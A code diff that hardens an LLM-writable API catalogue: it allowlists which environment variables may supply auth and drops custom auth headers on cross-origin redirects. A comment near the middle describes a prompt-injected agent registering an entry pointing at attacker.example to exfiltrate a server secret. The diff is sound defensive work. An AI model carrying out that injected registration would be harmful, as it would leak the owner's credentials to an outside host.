@@ -235,6 +235,7 @@ async function executeApiCall(
       method: opts.method,
       headers: { ...authHeaders, ...(opts.headers ?? {}) },
       body: opts.body,
+      sensitiveHeaders: new Set(Object.keys(authHeaders).map((h) => h.toLowerCase())),
     });
   } catch (err) {
     // Network / timeout / SSRF -> a hard failure; mark the entry broken.
@@ -343,19 +344,39 @@ export async function listCatalogApis(): Promise<
     .sort((a, b) => a.name.localeCompare(b.name));
 }
 
+/**
+ * Env vars an API entry's auth may reference. SECURITY CHOKE POINT: catalogue
+ * entries are LLM-writable (api_register, or datastore_save straight into
+ * api_catalog), so without this allowlist a prompt-injected agent could
+ * register `{baseUrl: attacker.example, auth: {kind:'bearer-env',
+ * envVar:'AUTH_SECRET'}}` and exfiltrate ANY server secret — the SSRF guard
+ * can't help because the attacker's own public host IS the legitimately
+ * registered target. Only names listed here (seeded keys + the owner-managed
+ * comma-separated API_CATALOG_ALLOWED_ENV env var) ever resolve; everything
+ * else is refused at call time, however the entry got into the catalogue.
+ */
+function allowedAuthEnvVars(): Set<string> {
+  const extra = (process.env.API_CATALOG_ALLOWED_ENV ?? '')
+    .split(',')
+    .map((s) => s.trim())
+    .filter(Boolean);
+  return new Set(['COMPANIES_HOUSE_API_KEY', ...extra]);
+}
+
 /** Resolve the auth header for an entry. Throws a clear error if the env is missing. */
 function resolveAuthHeaders(entry: ApiEntry): Record<string, string> {
   const auth = entry.auth ?? { kind: 'none' };
   if (auth.kind === 'none') return {};
-  if (auth.kind === 'bearer-env') {
+  if (auth.kind === 'bearer-env' || auth.kind === 'header-env') {
+    if (!allowedAuthEnvVars().has(auth.envVar)) {
+      throw new Error(
+        `API "${entry.name}" references env var ${auth.envVar}, which is not on the API-auth allowlist. ` +
+          `Add it to API_CATALOG_ALLOWED_ENV on the server (owner action) before this API can authenticate.`,
+      );
+    }
     const v = process.env[auth.envVar];
     if (!v) throw new Error(`API "${entry.name}" needs env var ${auth.envVar}, which is not set on this host.`);
-    return { Authorization: `Bearer ${v}` };
-  }
-  if (auth.kind === 'header-env') {
-    const v = process.env[auth.envVar];
-    if (!v) throw new Error(`API "${entry.name}" needs env var ${auth.envVar}, which is not set on this host.`);
-    return { [auth.header]: v };
+    return auth.kind === 'bearer-env' ? { Authorization: `Bearer ${v}` } : { [auth.header]: v };
   }
   return {};
 }
@@ -377,7 +398,14 @@ const AUTH_HEADERS = new Set(['authorization', 'cookie', 'proxy-authorization'])
  */
 async function guardedFetch(
   url: string,
-  opts: { method?: string; headers?: Record<string, string>; body?: unknown } = {},
+  opts: {
+    method?: string;
+    headers?: Record<string, string>;
+    body?: unknown;
+    /** Lower-cased names of caller-injected auth headers (e.g. a header-env
+     *  custom header) that must ALSO be dropped on a cross-origin redirect. */
+    sensitiveHeaders?: Set<string>;
+  } = {},
 ): Promise<{ status: number; ok: boolean; contentType: string; text: string; truncated: boolean }> {
   const baseHeaders: Record<string, string> = {
     Accept: 'application/json, text/*;q=0.8',
@@ -412,11 +440,16 @@ async function guardedFetch(
         },
       });
 
-      // Strip auth/cookie headers once we have left the original origin.
+      // Strip auth/cookie headers once we have left the original origin —
+      // including any CUSTOM auth header injected via header-env (X-API-Key
+      // etc.), which the fixed builtin set would otherwise forward to a
+      // redirect target on a different origin.
       const headers = { ...baseHeaders };
       if (new URL(current).origin !== originalOrigin) {
         for (const h of Object.keys(headers)) {
-          if (AUTH_HEADERS.has(h.toLowerCase())) delete headers[h];
+          if (AUTH_HEADERS.has(h.toLowerCase()) || opts.sensitiveHeaders?.has(h.toLowerCase())) {
+            delete headers[h];
+          }
         }
       }
 
